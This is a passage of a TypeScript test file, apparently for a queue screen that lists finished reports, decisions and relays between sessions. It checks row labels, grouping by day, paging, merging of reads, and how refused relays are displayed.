      ["Today", [[5, 1, true], [4, 1, true]]],
      ["Yesterday", [[3, 1, true]]],
      ["Nov 16", [[2, 1, true], [1, 1, true]]],
    ]);
  });

  // spec §4.6 → How it ended: an answer on the page first, whatever status followed it; the tag column says how it ended, its title
  // where, and the fact column names the kind
  const ends = [
    { name: "an option picked on the page reads its code, its title the route", item: doneDecision(), end: { text: "Answer R1", title: "Answered" }, kind: "Decision" },
    { name: "free text alone reads Answered", item: doneDecision({ answer: { code: null, text: "R2로 가되" } }), end: { text: "Answered", title: "Answered" }, kind: "Decision" },
    { name: "an answer sent as a message names that route", item: doneDecision({ answer: { code: "R2", text: null }, answerRecord: record("message") }), end: { text: "Answer R2", title: "Sent as a message" }, kind: "Decision" },
    { name: "a decision withdrawn after its answer keeps its answer", item: doneDecision({ status: "withdrawn" }), end: { text: "Answer R1", title: "Answered" }, kind: "Decision" },
    { name: "an answer outside the page reads Answered with where", item: doneDecision({ status: "answered", answer: { code: null, text: null }, answerRecord: null, isAnsweredOutside: true }), end: { text: "Answered", title: "Answered outside the Queue page." }, kind: "Decision" },
    { name: "a report replied to reads Replied", item: doneReport({ status: "delivered", answerRecord: record("reply"), ...answered }), end: { text: "Replied" }, kind: "Report" },
    { name: "a report marked read reads Read", item: doneReport(), end: { text: "Read" }, kind: "Report" },
    { name: "a withdrawn report says the session withdrew it", item: doneReport({ status: "withdrawn" }), end: { text: "Withdrawn", title: "The session withdrew it." }, kind: "Report" },
  ];
  for (const row of ends) {
    test(`how it ended: ${row.name}`, () => {
      assert.deepEqual(
        [call("getEndQ", row.item), call("getRowCellsQ", { item: row.item, copies: [row.item], isDone: true }, false)],
        [row.end, { tags: [row.end], fact: row.kind, extras: [] }],
      );
    });
  }

  test("a done row draws how it ended as plain text in the tag cell, titled where, its kind in the fact cell, ages from its end, and its name says how it ended once", () => {
    const item = doneReport({ status: "withdrawn", askedAt: "2026-11-10T06:12:43.518Z" });
    const tree = render("QueueRowQ", { row: { id: item.id, item, copies: [item], isDone: true }, isSelected: false, cols: ["tag", "fact"], view: { isNameShown: true, isAccountShown: false, tabStopId: item.id }, onSelect: () => undefined, onOrder: () => undefined });
    const [row] = findNodes(tree, (node) => node.props?.role === "option");
    const [tag] = byClass(tree, "queue-row-tag");
    const [fact] = byClass(tree, "queue-row-fact");
    const [age] = byClass(tree, "queue-row-age");
    const label = String(row?.props["aria-label"]);
    assert.deepEqual(
      [collectText(tag as RenderedNode), findNodes(tag as RenderedNode, (node) => node.props?.atom === "Badge").length, byClass(tag as RenderedNode, "queue-row-kind")[0]?.props.title, collectText(fact as RenderedNode), fact?.props.title, age?.props.title],
      ["Withdrawn", 0, "The session withdrew it.", "Report", undefined, "11-19 14:30"],
    );
    assert.match(label, /^Report from atrium \(self-named\): Deploy 65 finished, Withdrawn, ended \S+ ago$/);
  });

  test("the done read asks the history read for kind item, scoped by the ticks and the account", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async (url: string) => { urls.push(url); return { status: 200, json: async () => ({ items: [], nextCursor: null }) }; } })) as ScreenModule;
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID], before: null, setThread: () => undefined, kind: "item", profile: "personal" });
    assert.deepEqual(Object.fromEntries(new URL(urls[0] as string, "http://monitor").searchParams), { limit: "30", kind: "item", sessionIds: SESSION_ID, profile: "personal" });
  });

  const portfolio = buildSession({ id: "d4", name: "portfolio", profileLabel: "personal" });
  const open = (id: number, overrides: Record<string, unknown> = {}) => buildItem({ id, ...overrides });
  const getGroups = (items: unknown[], done: unknown[], filter: Record<string, string> = { profile: "" }, ids: string[] = []) =>
    call<Array<{ key: string; isDone?: boolean; label: string; rows: Array<{ id: number; item: { status: string } }> }>>("getListGroupsQ", items, { done: { items: done, nextCursor: null }, relays: { items: [], refusals: [], nextCursor: null } }, filter, ids);

  test("every open band stands above every Done band, and an item both reads return is drawn once, in its open band", () => {
    const items = [open(1, { kind: "report" }), open(2), open(3, { status: "answered", ...answered })];
    const done = [doneDecision({ id: 3 }), doneReport(), doneDecision({ closedAt: "2026-11-12T05:30:00.000Z" })];
    const rows = getGroups(items, done).flatMap((group) => group.rows.map((row) => [group.isDone === true, row.id]));
    assert.deepEqual(rows, [[false, 2], [false, 1], [false, 3], [true, 806], [true, 812]]);
  });

  // spec §4.6 → Ticks and the Account filter act on both parts at once
  const scopes = [
    { name: "nothing ticked and every account → both parts whole", filter: { profile: "" }, ids: [], expected: [1, 2, 806, 807] },
    { name: "a tick scopes both parts to its session", filter: { profile: "" }, ids: ["d4"], expected: [2, 807] },
    { name: "a tick with no open item leaves its done ones alone", filter: { profile: "" }, ids: ["c3"], expected: [806] },
    { name: "an account scopes both parts to it", filter: { profile: "personal" }, ids: [], expected: [2, 807] },
  ];
  for (const row of scopes) {
    test(`the list's scope: ${row.name}`, () => {
      const groups = getGroups([open(1), open(2, { session: portfolio })], [doneReport(), doneReport({ id: 807, session: portfolio })], row.filter, row.ids);
      assert.deepEqual(groups.flatMap((group) => group.rows.map((row) => row.id)), row.expected);
    });
  }

  // the list order is the step order: ↓, J and the sheet's next pass from the last open row to the first done one
  test("the list keys and the sheet's stepping cross from the last open row to the first done row and back", () => {
    const groups = getGroups([open(1), open(2, { kind: "report" })], [doneReport(), doneDecision()]);
    const rows = call<unknown[]>("getRowsQ", groups);
    const steps = call<{ nextId: number; count: number }>("getStepsQ", groups, 2, -1);
    const back = call<{ prevId: number }>("getStepsQ", groups, 806, -1);
    assert.deepEqual([call("getKeyedRowIdQ", rows, 2, "ArrowDown"), call("getKeyedRowIdQ", rows, 806, "ArrowUp"), steps.nextId, back.prevId, steps.count], [806, 2, 806, 2, 4]);
  });

  test("after an act the next open item takes the sheet, never a done one", () => {
    const groups = getGroups([open(1), open(2)], [doneReport(), doneDecision()]);
    const items = call<Array<{ item: unknown }>>("getRowsQ", groups).map((row) => row.item);
    assert.deepEqual([call("getNextAwaitingIdQ", items, 2), call("getNextAwaitingIdQ", items.filter((item) => (item as { id: number }).id !== 1), 2)], [1, null]);
  });

  // an open item on the sheet that the session ends meanwhile → its sheet says it left, never a done sheet over the open copy it holds
  test("an open item that leaves while on the sheet keeps the left sheet when its done row arrives", () => {
    const { queue } = buildQueue();
    const held = open(3);
    const groups = getGroups([], [doneDecision({ id: 3, status: "withdrawn" })]);
    const sheet = call("getSheetStateQ", groups, "3", { item: held, copies: [held] });
    const [shown] = findNodes(render("QueueSheetQ", { queue: { ...queue, groups, sheet } }), (node) => node.type === "ItemSheetQ");
    assert.deepEqual([(sheet as { kind: string }).kind, shown?.props.hasLeft, shown?.props.isDone], ["left", true, false]);
  });

  // spec §4.2 → Column rule: a band draws the tag and fact columns only while one of its loaded rows fills them, and then on every row
  const bandColumns = [
    { name: "open reports fill neither, so their band draws neither", items: [open(1, { kind: "report" }), open(2, { kind: "report" })], done: [], cols: "" },
    { name: "decisions with no Approval fill the fact alone", items: [open(1), open(2)], done: [], cols: "fact" },
    { name: "one Approval draws the tag column on every decision of its band", items: [open(1, { isApprovalClass: true }), open(2)], done: [], cols: "tag fact" },
    { name: "a Done band's rows fill both", items: [], done: [doneReport(), doneDecision()], cols: "tag fact" },
  ];
  for (const row of bandColumns) {
    test(`band columns: ${row.name}`, () => {
      const [group] = getGroups(row.items, row.done);
      const { queue } = buildQueue();
      const tree = render("QueueGroupQ", { group, queue, view: { isNameShown: true, isAccountShown: false, tabStopId: 1 } });
      const [band] = findNodes(tree, (node) => node.props?.role === "group");
      const drawn = (name: string) => (row.cols.split(" ").includes(name) ? group!.rows.length : 0);
      assert.deepEqual(
        [band?.props["data-cols"], byClass(tree, "queue-row-tag").length, byClass(tree, "queue-row-fact").length],
        [row.cols, drawn("tag"), drawn("fact")],
      );
    });
  }

  test("a Done band reads Done and its day in the count's place, and names its group Done, Today", () => {
    const groups = getGroups([], [doneReport({ closedAt: new Date().toISOString() })]);
    const { queue } = buildQueue();
    const tree = render("QueueGroupQ", { group: groups[0], queue, view: { isNameShown: true, isAccountShown: false, tabStopId: 806 } });
    const [group] = findNodes(tree, (node) => node.props?.role === "group");
    const [band] = byClass(tree, "queue-band");
    assert.deepEqual(
      [group?.props["aria-label"], collectText(band as RenderedNode), findNodes(band as RenderedNode, (node) => node.props?.atom === "Badge").length, collectText(byClass(tree, "queue-band-day")[0] as RenderedNode)],
      ["Done, Today", "Done Today", 0, "Today"],
    );
  });

  // the queue as useQueueStateQ hands it to the list: its open read, its done read, and the one list's bands
  const listQueue = (items: unknown[], thread: Record<string, unknown> = {}, extra: Record<string, unknown> = {}, relayThread: Record<string, unknown> = {}) => {
    const { queue, calls } = buildQueue({ loadMore: () => calls.push(["loadMore"]) });
    const done = { ...queue.done, thread: { ...queue.done.thread, ...thread } };
    const relays = { ...queue.relays, thread: { ...queue.relays.thread, ...relayThread } };
    const base = { ...withList(queue, items), done, relays, ...extra };
    const groups = getGroups(items, done.thread.items as unknown[]);
    return { queue: { ...base, groups, sheet: getSheet(groups, ""), selectedId: null }, calls };
  };
  const bodyOf = (queue: { list: { data: { items: unknown[] } | null } }) => render("ListBodyQ", { queue, items: queue.list.data?.items ?? [] });
  const getBody = (tree: RenderedNode) => ({
    rows: findNodes(tree, (node) => node.type === "QueueRowQ").map((node) => (node.props.row as { id: number }).id),
    loading: findNodes(tree, (node) => node.props?.atom === "LoadingPlaceholder").map((node) => node.props.label),
    empty: findNodes(tree, (node) => node.props?.atom === "EmptyState").map((node) => node.props.message),
    failures: findNodes(tree, (node) => node.type === "QueueFailureQ").length,
  });
  const FAILURE = { sentence: "The queue could not be read.", next: "Retry.", detail: "503" };

  // spec §4.6 → States
  const states = [
    { name: "open and handled items → the open rows, then the done rows", items: [open(1)], thread: { items: [doneReport()] }, expected: { rows: [1, 806], loading: [], empty: [], failures: 0 } },
    { name: "no open item, handled ones → the done rows from the top", items: [], thread: { items: [doneReport()] }, expected: { rows: [806], loading: [], empty: [], failures: 0 } },
    { name: "open items, none handled → the open rows, nothing under them", items: [open(1)], thread: {}, expected: { rows: [1], loading: [], empty: [], failures: 0 } },
    { name: "the first done read in flight → the queue loading, though open rows are read", items: [open(1)], thread: { status: "loading", hasRead: undefined }, expected: { rows: [], loading: ["the queue"], empty: [], failures: 0 } },
    { name: "a later done read in flight → the rows stay", items: [open(1)], thread: { status: "loading", items: [doneReport()] }, expected: { rows: [1, 806], loading: [], empty: [], failures: 0 } },
    { name: "nothing in either part → the empty queue", items: [], thread: {}, expected: { rows: [], loading: [], empty: ["Nothing is waiting for you"], failures: 0 } },
    { name: "the done read failed → the open rows stay", items: [open(1)], thread: { status: "error", hasRead: undefined, error: FAILURE }, expected: { rows: [1], loading: [], empty: [], failures: 0 } },
    { name: "the first relay read in flight → the queue loading, though both other reads are in", items: [open(1)], thread: { items: [doneReport()] }, relays: { status: "loading", hasRead: undefined }, expected: { rows: [], loading: ["the queue"], empty: [], failures: 0 } },
  ];
  for (const row of states) {
    test(`the one list: ${row.name}`, () => assert.deepEqual(getBody(bodyOf(listQueue(row.items, row.thread, {}, row.relays).queue)), row.expected));
  }

  test("the empty queue's hint names every kind the list holds, relays included, and the page's check interval", () => {
    const [empty] = findNodes(bodyOf(listQueue([], {}).queue), (node) => node.props?.atom === "EmptyState");
    assert.equal(empty?.props.hint, "Reports, decisions and relays from sessions show here. The page checks every 15 seconds.");
  });

  test("the head counts the open items alone: 0 waiting while only done rows show", () => {
    const [card] = findNodes(render("QueueListQ", { queue: listQueue([], { items: [doneReport()] }).queue }), (node) => node.props?.atom === "Card");
    assert.equal(card?.props.sub, "0 waiting");
  });

  test("the open read failed with nothing loaded → the in-card error, whose Retry reads both parts", () => {
    const { queue, calls } = listQueue([], {}, { list: { status: "error", data: null, error: FAILURE, readAt: null, newIds: [] } });
    const [failure] = findNodes(bodyOf(queue), (node) => node.type === "QueueFailureQ");
    (failure?.props.onRetry as () => void)();
    assert.deepEqual(getPlain(calls), [["reload"], ["readDone"], ["readRelays"]]);
  });

  // spec §4.6 → More handled items: one line after the last row — the open read's next page first, then the done read's 30
  const listEnds = [
    { name: "the open read has more → Show more reads its next page", nextCursor: 9, thread: { items: [doneReport()], nextCursor: "1:1" }, expected: { more: [["loadMore"]], text: "Show more" } },
    { name: "the open read whole, the done read has more → Show more reads the next done page", nextCursor: null, thread: { items: [doneReport()], nextCursor: "1:1" }, expected: { more: [["moreDone"]], text: "Show more" } },
    { name: "a done page in progress → Loading…", nextCursor: null, thread: { status: "loading", items: [doneReport()], nextCursor: "1:1" }, expected: { more: [], text: "Loading…" } },
    { name: "200 done items loaded with more behind them → only the newest show", nextCursor: null, thread: { items: Array.from({ length: 200 }, (_, index) => doneReport({ id: index + 2 })), nextCursor: "1:1" }, expected: { more: [], text: "Showing the 200 most recent" } },
    { name: "the done read failed → its warning and a Retry that reads it again", nextCursor: null, thread: { status: "error", error: FAILURE }, expected: { more: [["readDone"]], text: "⚠ Done items could not be read. Retry" } },
    { name: "both reads whole → no line", nextCursor: null, thread: { items: [doneReport()] }, expected: { more: [], text: "" } },
  ];
  for (const row of listEnds) {
    test(`the list's end: ${row.name}`, () => {
      const { queue, calls } = listQueue([open(1)], row.thread);
      const tree = render("ListEndQ", { queue: { ...queue, list: { ...queue.list, data: { ...queue.list.data, nextCursor: row.nextCursor } } } });
      for (const button of findNodes(tree, (node) => node.type === "button")) (button.props.onClick as (() => void) | undefined)?.();
      assert.deepEqual({ more: getPlain(calls), text: collectText(tree).replace(/\s+/g, " ") }, row.expected);
    });
  }

  test("the card foot holds the status line alone, whatever is behind the list", () => {
    const { queue } = listQueue([open(1)], { items: [doneReport()], nextCursor: "1:1" });
    const tree = render("ListFootQ", { queue: { ...queue, list: { ...queue.list, data: { ...queue.list.data, nextCursor: 9 } } } });
    assert.deepEqual([findNodes(tree, (node) => node.type === "ShowMoreQ" || node.type === "button").length, findNodes(tree, (node) => node.props?.role === "status").length], [0, 1]);
  });

  // spec §4.6: a done item's sheet is read-only — its answer shown, no composer, the foot how and when it ended
  const sheets = [
    { name: "an answered decision shows its answer, its foot the answer and its end", item: doneDecision(), kind: "Decision", foot: "Answer R1 · Nov 19 14:30", hasAnswer: true },
    { name: "a read report shows its text, its foot Read and its end", item: doneReport(), kind: "Report", foot: "Read · Nov 19 14:30", hasAnswer: false },
    { name: "a decision withdrawn before any answer shows its question, no answer, its foot Withdrawn and its end", item: doneDecision({ status: "withdrawn", answer: null, answeredAt: null, answerRecord: null }), kind: "Decision", foot: "Withdrawn · Nov 19 14:30", hasAnswer: false },
  ];
  for (const row of sheets) {
    test(`the done sheet: ${row.name}`, () => {
      const tree = renderSheet({ item: row.item, queue: buildQueue().queue, cliPath: CLI_PATH, isDone: true });
      const [foot] = byClass(tree, "card-foot");
      const [kind] = findNodes(byClass(tree, "queue-sheet-head")[0] as RenderedNode, (node) => node.props?.atom === "Badge");
      assert.deepEqual(
        [collectText(foot as RenderedNode), findNodes(foot as RenderedNode, (node) => node.type === "button" || node.type === "ComposerQ").length, collectText(kind as RenderedNode), collectText(tree).includes("Your answer")],
        [row.foot, 0, row.kind, row.hasAnswer],
      );
    });
  }
});

// layout §1, §6 → Order, Ticks: the Done part merges the item thread and the relay thread, each paged by its own cursor
describe("relays in the Done part", () => {
  const relays = getRelayThreadFixture();
  const [REFUSAL] = relays.refusals;
  const atMinutes = (minutes: number) => new Date(FIXTURE_NOW - minutes * 60_000).toISOString();
  // a history cursor: its row's time in epoch microseconds, then its id
  const cursorAt = (minutes: number, id: number) => `${(FIXTURE_NOW - minutes * 60_000) * 1000}:${id}`;
  const ended = (id: number, minutes: number, kind = "report") => buildItem({ id, kind, status: "seen", options: [], closedAt: atMinutes(minutes) });
  const thread = (overrides: Record<string, unknown> = {}) => ({ status: "ready", hasRead: true, items: [], refusals: [], nextCursor: null, refusalCutAt: null, error: null, ...overrides });
  // a report ended 200 minutes ago and a decision 30 hours ago, beside the fixture's sends (4 h and 27 h ago, one at 2 h still on its way) and its refusal (3 h ago)
  const doneRead = (overrides: Record<string, unknown> = {}) => thread({ items: [ended(806, 200), ended(812, 30 * 60, "decision")], ...overrides });
  const relayRead = (overrides: Record<string, unknown> = {}) => thread({ items: relays.items, refusals: relays.refusals, ...overrides });
  type Row = { id: number | string; refusal?: { reason: string }; item?: { sendId: string | null }; copies: unknown[] };
  const getGroups = (open: unknown[], reads: Record<string, unknown>, ids: string[] = []) =>
    call<Array<{ isDone?: boolean; rows: Row[] }>>("getListGroupsQ", open, reads, { profile: "" }, ids);
  const named = (row: Row) => (row.refusal ? `refused ${row.refusal.reason}` : row.id);
  const getDoneBands = (open: unknown[], reads: Record<string, unknown>, ids: string[] = []) =>
    getGroups(open, reads, ids).filter((group) => group.isDone).map((group) => group.rows.map(named));

  test("Done rows run newest last act first across both reads, banded by the day of that act: an item's end, a send's send, a refusal's time", () => {
    assert.deepEqual(getDoneBands([], { done: doneRead(), relays: relayRead() }), [["refused pair_cap", 806, 412], [398, 812]]);
  });

  // one send, one row: the open part draws it first, and a send with a copy on its way is never in Done
  const onWay = relays.items.map((copy) => (copy.id === 413 ? { ...copy, status: "answered", relay: { ...copy.relay!, lapsedAt: null } } : copy));
  // the owner list leaves a redacted copy out → the sends it would hold, the fixture's redacted one on its way set apart
  const kept = (items: typeof relays.items) => items.filter((copy) => copy.relay!.redaction === null);
  const sends = [
    { name: "a send with a copy on its way is drawn in the open part alone", open: onWay.filter((copy) => copy.id === 413), relayItems: kept(onWay), expected: [[false, "forwarded"], [true, "received"]] },
    { name: "an ended send the open read still holds stays in the open part", open: relays.items.filter((copy) => copy.id === 412), relayItems: kept(relays.items), expected: [[false, "forwarded"], [true, "received"]] },
    { name: "a send on its way that the open read leaves out has no row", open: [], relayItems: kept(onWay), expected: [[true, "received"]] },
    { name: "a redacted send on its way, which the open list leaves out, is drawn under In delivery from the relay read", open: [], relayItems: relays.items, expected: [[false, "redacted"], [true, "forwarded"], [true, "received"]] },
  ];
  const sendNames = new Map(relays.items.map((copy) => [copy.sendId, copy.id >= 415 ? "redacted" : copy.id >= 412 ? "forwarded" : "received"]));
  for (const row of sends) {
    test(`one send, one row: ${row.name}`, () => {
      const drawn = getGroups(row.open, { done: thread(), relays: relayRead({ items: row.relayItems, refusals: [] }) })
        .flatMap((group) => group.rows.map((entry) => [group.isDone === true, sendNames.get(entry.item!.sendId)]));
      assert.deepEqual(drawn, row.expected);
    });
  }

  // no gap: a read's frontier is its oldest loaded row, none once whole; a row older than the newer frontier waits undrawn
  const frontiers = [
    { name: "both reads whole → every row", done: {}, relays: {}, expected: [["refused pair_cap", 806, 412], [398, 812]] },
    { name: "the relay read has more → item rows older than its oldest send wait", done: {}, relays: { items: relays.items.filter((copy) => copy.id >= 412), nextCursor: cursorAt(240, 412) }, expected: [["refused pair_cap", 806, 412]] },
    { name: "the item read has more → relay rows older than its oldest item wait", done: { items: [ended(806, 200)], nextCursor: cursorAt(200, 806) }, relays: {}, expected: [["refused pair_cap", 806]] },
    { name: "the relay read cut its refusals → the cut holds no row back, the hole being in the refusals alone", done: {}, relays: { refusalCutAt: REFUSAL!.at }, expected: [["refused pair_cap", 806, 412], [398, 812]] },
    { name: "a cursor in a form the page does not read → its frontier holds no row back", done: {}, relays: { nextCursor: `${atMinutes(240)}:412` }, expected: [["refused pair_cap", 806, 412], [398, 812]] },
  ];
  for (const row of frontiers) {
    test(`the merge: ${row.name}`, () => assert.deepEqual(getDoneBands([], { done: doneRead(row.done), relays: relayRead(row.relays) }), row.expected));
  }

  // a relay is in scope by either end, a refusal too (the relay read takes the ticks as sessionIds and matches either end)
  const ticks = [
    { name: "only the sender ticked shows its relay", ids: [FIXTURE_SESSION_IDS.aidl], expected: [[412]] },
    { name: "only one of its recipients ticked shows it", ids: [FIXTURE_SESSION_IDS.portfolio], expected: [[412]] },
    { name: "a third session ticked hides it", ids: [FIXTURE_SESSION_IDS.atrium], expected: [[398]] },
    { name: "a refusal shows by its sender, beside a relay to that session", ids: [FIXTURE_SESSION_IDS.gersona], expected: [["refused pair_cap"], [398]] },
  ];
  for (const row of ticks) {
    test(`ticks: ${row.name}`, () => assert.deepEqual(getDoneBands([], { done: thread(), relays: relayRead() }, row.ids), row.expected));
  }

  test("a send with one copy redacted is one In delivery row holding the open list's copy and the relay read's redacted one", () => {
    const [redacted] = relays.items.filter((copy) => copy.id === 415);
    const other = { ...redacted!, id: 416, session: { ...redacted!.session, id: FIXTURE_SESSION_IDS.yoaida, sessionIdPrefix: FIXTURE_SESSION_IDS.yoaida.slice(0, 8), name: "yoaida" }, relay: { ...redacted!.relay!, redaction: null } };
    const open = getGroups([other], { done: thread(), relays: relayRead({ items: [redacted, other], refusals: [] }) }).filter((group) => !group.isDone);
    assert.deepEqual(open.map((group) => group.rows.map((row) => (row.copies as Array<{ id: number }>).map((copy) => copy.id))), [[[415, 416]]]);
  });

  const cellOf = (tree: RenderedNode, name: string) => {
    const [cell] = byClass(tree, name);
    return cell === undefined ? null : collectText(cell).replace(/\s+/g, " ").trim();
  };
  const getDoneRowShape = (tree: RenderedNode) => {
    const [row] = findNodes(tree, (node) => node.props?.role === "option");
    return {
      who: cellOf(tree, "queue-row-name"), isMarked: byClass(tree, "queue-row-mark").length === 1, title: cellOf(tree, "queue-row-title"), tag: cellOf(tree, "queue-row-tag"), fact: cellOf(tree, "queue-row-fact"),
      badges: findNodes(tree, (node) => node.props?.atom === "Badge").length,
      label: String(row?.props["aria-label"]).replace(/, (sent )?\S+ ago$/, ""), tip: row?.props.title ?? null,
    };
  };

  // how a Done relay ended (layout §1, §5): plain words in its tag column, said after its title in its accessible name; its fact Relay
  const sendOf = (sendId: string | null) => relays.items.filter((copy) => copy.sendId === sendId);
  const [RECEIVED, FORWARDED] = [sendOf(relays.items.find((copy) => copy.id === 398)!.sendId), sendOf(relays.items.find((copy) => copy.id === 412)!.sendId)];
  const lapse = (copy: (typeof relays.items)[number]) => ({ ...copy, status: "withdrawn", deliveredAt: null, relay: { ...copy.relay!, lapsedAt: atMinutes(60) } });
  const endings = [
    {
      name: "every copy received reads Received", copies: RECEIVED,
      shape: { who: "atrium", isMarked: true, title: `→ gersona ${RECEIVED[0]!.title}`, tag: "Received", fact: "Relay", badges: 0, label: `Relay from atrium (self-named) to gersona: ${RECEIVED[0]!.title}, received`, tip: "Relay" },
    },
    {
      name: "of several, some lapsed reads how many, and a relay passed on says its hop", copies: FORWARDED,
      shape: { who: "aidl", isMarked: true, title: `→ 2 sessions ${FORWARDED[0]!.title}`, tag: "1 lapsed", fact: "Relay", badges: 0, label: `Relay from aidl (self-named) to 2 sessions: ${FORWARDED[0]!.title}, 1 lapsed, passed on, hop 1`, tip: "Relay · passed on, hop 1" },
    },
    {
      name: "every copy lapsed reads Lapsed", copies: FORWARDED.map(lapse),
      shape: { who: "aidl", isMarked: true, title: `→ 2 sessions ${FORWARDED[0]!.title}`, tag: "Lapsed", fact: "Relay", badges: 0, label: `Relay from aidl (self-named) to 2 sessions: ${FORWARDED[0]!.title}, lapsed, passed on, hop 1`, tip: "Relay · passed on, hop 1" },
    },
  ];
  for (const row of endings) {
    test(`a Done relay's row: ${row.name}`, () => {
      const tree = render("QueueRowQ", { row: { id: row.copies[0]!.id, item: row.copies[0], copies: row.copies, isDone: true }, isSelected: false, cols: ["tag", "fact"], view: { isNameShown: true, isAccountShown: false, tabStopId: null }, onSelect: () => undefined, onOrder: () => undefined });
      assert.deepEqual(getDoneRowShape(tree), row.shape);
    });
  }

  // a refused relay's row (layout §1, §5): its sender, `→` its recipients and the reason's name; a name by id prefix from the loaded relays, else the rail's rows, else the id
  const GERSONA = FIXTURE_SESSION_IDS.gersona.slice(0, 8);
  const YOAIDA = FIXTURE_SESSION_IDS.yoaida.slice(0, 8);
  const railRows = [{ sessionIdPrefix: GERSONA, name: "gersona", isNameRegistered: true }, { sessionIdPrefix: YOAIDA, name: "yoaida", isNameRegistered: true }];
  const startDirectoryRail = railRows.map((session) => ({ ...session, isNameRegistered: false }));
  // a send from GERSONA under the name its session registered, to a session that is not GERSONA
  const sentAs = (selfDeclaredName: string) => [{ ...FORWARDED[0]!, relay: { ...FORWARDED[0]!.relay!, sender: { ...FORWARDED[0]!.relay!.sender, sessionIdPrefix: GERSONA, selfDeclaredName } } }];
  // every registered name is the session's own writing → marked, the recipient bare in the title cell and in words in the accessible name
  const BOTH_NAMED = { who: "gersona", isMarked: true, title: "→ yoaida Too many to one session", label: "Refused relay from gersona (self-named) to yoaida (self-named): Too many to one session" };
  const refusedRows = [
    { name: "named by the loaded relays", refusal: REFUSAL, items: relays.items, rail: [], shape: BOTH_NAMED },
    { name: "named by the rail's rows when no loaded relay names them", refusal: REFUSAL, items: [], rail: railRows, shape: BOTH_NAMED },
    { name: "named by the rail's start-directory names → no mark", refusal: REFUSAL, items: [], rail: startDirectoryRail, shape: { who: "gersona", isMarked: false, title: "→ yoaida Too many to one session", label: "Refused relay from gersona to yoaida: Too many to one session" } },
    { name: "named by neither → its ids", refusal: REFUSAL, items: [], rail: [], shape: { who: GERSONA, isMarked: false, title: `→ ${YOAIDA} Too many to one session`, label: `Refused relay from ${GERSONA} to ${YOAIDA}: Too many to one session` } },
    { name: "named only by a loaded relay's sender name", refusal: REFUSAL, items: sentAs("gersona"), rail: railRows.slice(1), shape: BOTH_NAMED },
    { name: "the rail's read of a name wins where a loaded relay's read differs", refusal: REFUSAL, items: sentAs("yoaida"), rail: railRows, shape: BOTH_NAMED },
    { name: "to several → their count", refusal: { ...REFUSAL!, recipientIdPrefixes: [YOAIDA, GERSONA] }, items: relays.items, rail: [], shape: { who: "gersona", isMarked: true, title: "→ 2 sessions Too many to one session", label: "Refused relay from gersona (self-named) to 2 sessions: Too many to one session" } },
    { name: "to no resolvable session → the unknown count", refusal: { ...REFUSAL!, reason: "sender_cap", recipientIdPrefixes: [], unresolvedCount: 1 }, items: relays.items, rail: [], shape: { who: "gersona", isMarked: true, title: "→ 1 unknown recipient Too many from one session", label: "Refused relay from gersona (self-named) to 1 unknown recipient: Too many from one session" } },
  ];
  for (const row of refusedRows) {
    test(`a refused relay's row: ${row.name}, Refused its tag and Relay its fact, no badge, the tip its Done relay siblings carry`, () => {
      const { queue } = buildQueue({ relays: { thread: thread({ items: row.items }) }, sessions: { region: { data: { sessions: row.rail } } } });
      const [group] = call<unknown[]>("getDoneGroupsQ", [call("getRefusalRowQ", row.refusal)]);
      const shape = getDoneRowShape(render("QueueGroupQ", { group, queue, view: { isNameShown: true, isAccountShown: false, tabStopId: null } }));
      assert.deepEqual(shape, { ...row.shape, tag: "Refused", fact: "Relay", badges: 0, tip: "Relay" });
    });
  }

  const FAILURE = { sentence: "The queue could not be read.", next: "Retry.", detail: "503" };
  const endOf = (done: Record<string, unknown>, relayThread: Record<string, unknown>) => {
    const { queue, calls } = buildQueue();
    const reads = { done: { ...queue.done, thread: done }, relays: { ...queue.relays, thread: relayThread } };
    const groups = getGroups([], { done, relays: relayThread });
    const tree = render("ListEndQ", { queue: { ...withList(queue, []), ...reads, groups } });
    for (const button of findNodes(tree, (node) => node.type === "button")) (button.props.onClick as (() => void) | undefined)?.();
    return { more: getPlain(calls), text: collectText(tree).replace(/\s+/g, " ") };
  };
  const manyEnded = Array.from({ length: 199 }, (_, index) => ended(index + 1, index + 1));
  // the fixture's refusal at 2026-11-13 12:00 KST is the oldest the cut page listed
  const CUT_LINE = "⚠ Refusals before Nov 13 12:00 not listed.";
  const ends = [
    { name: "the item read's frontier is newer → Show more reads the item read", done: doneRead({ items: [ended(806, 200)], nextCursor: cursorAt(200, 806) }), relays: relayRead({ nextCursor: cursorAt(1620, 398) }), expected: { more: [["moreDone"]], text: "Show more" } },
    { name: "the relay read's frontier is newer → Show more reads the relay read", done: doneRead({ nextCursor: cursorAt(1800, 812) }), relays: relayRead({ items: relays.items.filter((copy) => copy.id >= 412), nextCursor: cursorAt(240, 412) }), expected: { more: [["moreRelays"]], text: "Show more" } },
    { name: "200 Done rows across both reads with more behind them → only the newest show", done: thread({ items: manyEnded, nextCursor: cursorAt(199, 1) }), relays: thread({ refusals: [{ ...REFUSAL!, at: atMinutes(0) }] }), expected: { more: [], text: "Showing the 200 most recent" } },
    { name: "a send on its way counts nowhere → 199 Done rows beside it still offer Show more", done: thread({ items: manyEnded, nextCursor: cursorAt(199, 1) }), relays: thread({ items: relays.items.filter((copy) => copy.id >= 415) }), expected: { more: [["moreDone"]], text: "Show more" } },
    { name: "the relay read failed → the Done warning and a Retry that reads the relay read", done: doneRead(), relays: thread({ status: "error", error: FAILURE }), expected: { more: [["readRelays"]], text: "⚠ Done items could not be read. Retry" } },
    { name: "both reads failed → one warning, whose Retry reads both", done: thread({ status: "error", error: FAILURE }), relays: thread({ status: "error", error: FAILURE }), expected: { more: [["readDone"], ["readRelays"]], text: "⚠ Done items could not be read. Retry" } },
    { name: "the relay read cut its refusals and has more → Show more in its own place reads the relay read, then the cut line", done: doneRead(), relays: relayRead({ refusalCutAt: REFUSAL!.at, nextCursor: cursorAt(1620, 398) }), expected: { more: [["moreRelays"]], text: "Show more " + CUT_LINE } },
    { name: "the relay read cut its refusals and the item read has a cursor behind the cut → Show more in its own place reads the item read, then the cut line", done: doneRead({ items: [ended(806, 200)], nextCursor: cursorAt(200, 806) }), relays: relayRead({ refusalCutAt: REFUSAL!.at }), expected: { more: [["moreDone"]], text: "Show more " + CUT_LINE } },
    { name: "the relay read cut its refusals and both reads are whole → the cut line alone", done: doneRead(), relays: relayRead({ refusalCutAt: REFUSAL!.at }), expected: { more: [], text: CUT_LINE } },
  ];
